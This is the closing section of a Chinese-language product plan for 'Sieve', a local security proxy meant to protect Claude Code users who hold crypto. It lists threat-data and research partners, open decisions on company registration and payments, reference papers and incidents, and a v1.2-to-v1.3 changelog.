### 13.2 🆕 数据侧合作清单(v1.3 新增)

GPT-5.5 review 的关键 insight:**最有价值的合作不是云模型厂商,而是数据侧伙伴**。


| 合作方                       | 数据                                  | 接洽方式                    | 优先级 | 阶段        |
| ------------------------- | ----------------------------------- | ----------------------- | --- | --------- |
| **慢雾 SlowMist**           | misttrack-skills 数据库、恶意地址 SDK       | 通过 @evilcos 接洽,可能商谈商用授权 | ⭐⭐⭐ | Week 11 起 |
| **ScamSniffer**           | 黑名单(7 天延迟开源 → Pro realtime $999/月)  | 商业合作                    | ⭐⭐⭐ | Phase 2   |
| **GoPlus Security**       | 免费 Token API + Address Security API | 直接 API 集成,免费            | ⭐⭐  | Phase 2   |
| **Chainabuse (TRM Labs)** | 钱包黑名单 API                           | 免费层 + 商业层               | ⭐⭐  | Phase 2   |
| **L2BEAT**                | 跨链桥 registry                        | 开源数据,直接用                | ⭐   | Phase 2   |
| **Sourcify**              | 4byte selector 已验证合约                | 开源,直接下载离线副本             | ⭐⭐  | Phase 2   |
| **Forta Network**         | Scam Detector v2                    | $899/月订阅                | ⭐   | 选购        |


### 13.3 内容/研究合作清单


| 合作方                            | 价值                                                   | 接洽方式                    |
| ------------------------------ | ---------------------------------------------------- | ----------------------- |
| **Chaofan Shou (@Fried_rice)** | UCSB 论文一作,Fuzzland CTO,bounty $1.9M。**Sieve 顾问最佳人选** | Week 11 主动接洽            |
| **慢雾 @evilcos**                | 中文圈 crypto 安全 KOL,持续推 AI 安全                          | Week 11 主动接洽,数据 + 内容双合作 |
| **Yu Feng**                    | UCSB 教授,Fuzzland 联创,论文通讯                             | 通过 Chaofan 间接接洽         |


---

## 14. Open Questions(还需要 doskey 决策)

1. **正式产品名** —— Week 6-8 之间必须定
2. **冷启动文章排序** —— Week 12 GA 同步发文章 1 + 2(中转站揭黑 + 自证清白),Week 14 发文章 3(Drainer 复盘)
3. **🆕 法律实体注册** —— 香港 vs 新加坡?
  - **建议**:香港(注册快、成本低、银行账户对中国国籍友好、可衔接 Stripe Asia)
  - **次选**:新加坡(税务更友好但注册周期长)
  - **第三**:美国 Stripe Atlas(Stripe 集成最丝滑,但银行账户对中国国籍不友好)
4. **Week 9 闭测邀请名单** —— 5 个 hackathon builder + 审计研究员的具体名字
5. **加密收款实现** —— USDC on Ethereum / Polygon / Solana?用 Coinbase Commerce / 自部署 / Stripe Crypto?
6. **降级模式 UI** —— 试用结束如何过渡到只读警告而不让用户感觉被坑

---

## 15. 关键参考资料

### 15.1 学术论文

- *Your Agent Is Mine* (UCSB+Fuzzland, arXiv:2604.08407, 2026-04)
- *Blockchain Address Poisoning* (arXiv:2501.16681, 2025)
- *Trojan Source* (USENIX '23, arXiv:2111.00169)

### 15.2 关键事件

- LiteLLM 1.82.7/1.82.8 PyPI 投毒(2026-03-24)
- @solana/web3.js 投毒(2024-12-02)
- North Korea Contagious Interview campaign(2025-07~)
- Pink Drainer EIP-712 数字化绕过(2024-2025)

### 15.3 必读项目

- gitleaks / TruffleHog / detect-secrets — secret 检测参考
- Cloudflare Pingora — Rust 反向代理参考
- StepSecurity Harden-Runner — eBPF 安全代理范式
- **🆕 Sigstore + Reproducible Builds** — 自证清白产品特征实现参考

### 15.4 监管参考(v1.3 新增)

- 《生成式人工智能服务管理暂行办法》(国家网信办 2023)
- 上海市八部门关于虚拟货币业务的通知(2026-02)
- 个人信息保护法相关解释

---

## 文档结束

> **核心一句话**:Sieve v1.3 是一个用第一性原理推出的、12 周冲完 GA、单一 $49/月定价、海外公司主体、只服务 Claude Code 重度用户中的 crypto 持仓者的、由 doskey 个人 IP 背书的本地安全代理。它不是 LLM 安全产品,是"在不可逆动作前插入认知摩擦的保险工具"。它的差异化不只是检测能力,还有"自证清白"的可验证性。它的中国大陆边界是清晰的:doskey 在国内做研发,海外公司收钱,境内境外渠道分开做。

---

## v1.2 → v1.3 changelog

- **+** §1.2 加第 4 句"自证清白"核心叙事(GPT-5.5 review #2)
- **+** §1.4 法律实体明确(海外注册,香港首选)
- **+** §3.1 P0 客群地理分布:海外为主
- **+** §3.3 不服务客群:中国大陆境内公开 to-C 商业化
- **+** §5.2 Phase 2 加 IN-MCP-01~03 MCP 拦截(GPT-5.5 review #7)
- **+** §6.2 关键技术决策强化论证:数据标注稀缺性(GPT-5.5 review #3)
- **+** §10.1 Week 1 sigstore + reproducible build pipeline 必须本周跑通
- **+** §10.1 Week 4 benchmark 数据集大小具体化:200-500 攻击 + 50-100 benign(GPT-5.5 review #4)
- **+** §10.2 Week 9 闭测画像精确化:hackathon builder + 审计研究员(GPT-5.5 review #5)
- **+** §10.2 Week 10 文章 2 改为"自证清白"主题
- **+** §10.2 Week 11 KOL 接洽:数据合作优先于内容合作
- **+** §11.3 透明更新日志加入开源策略
- **+** §11.5 中国大陆合规边界整章新增(GPT-5.5 review #1)
- **+** §12 风险登记册加 3 条:大陆监管、用户教育成本、海外公司注册周期(GPT-5.5 review #8)
- **+** §13.2 数据侧合作清单整表新增(GPT-5.5 review #6)
- **+** §13.3 内容/研究合作清单
- **+** §14 Open Questions 加加密收款方案
- **+** §15.4 监管参考资料

— *基于 v1.2 + GPT-5.5 review 整理,2026-04-26*